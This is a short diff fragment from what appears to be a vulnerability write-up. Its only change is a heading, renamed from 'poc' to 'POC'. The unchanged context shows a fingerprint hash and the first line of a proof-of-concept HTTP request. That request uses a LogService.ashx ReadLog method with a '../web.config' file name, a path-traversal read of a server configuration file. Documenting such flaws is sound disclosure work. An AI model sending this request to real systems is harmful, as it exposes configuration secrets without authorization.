@@ -10,7 +10,7 @@ icon_hash="-338936081"
 
 ![image-20240801191240895](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408011912982.png)
 
-## poc
+## POC
 
 ```yaml
 GET /ajax/sys/LogService.ashx?Method=ReadLog&FileName=../web.config HTTP/1.1
